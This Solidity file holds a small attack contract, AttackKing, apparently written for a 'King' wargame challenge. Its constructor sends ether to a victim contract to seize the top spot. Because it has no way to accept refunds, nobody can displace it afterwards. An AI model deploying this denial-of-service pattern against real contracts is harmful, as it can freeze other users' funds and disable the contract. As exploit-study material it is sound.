// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address payable _victim) public payable {
        _victim.call{value:msg.value}("");
    }
}
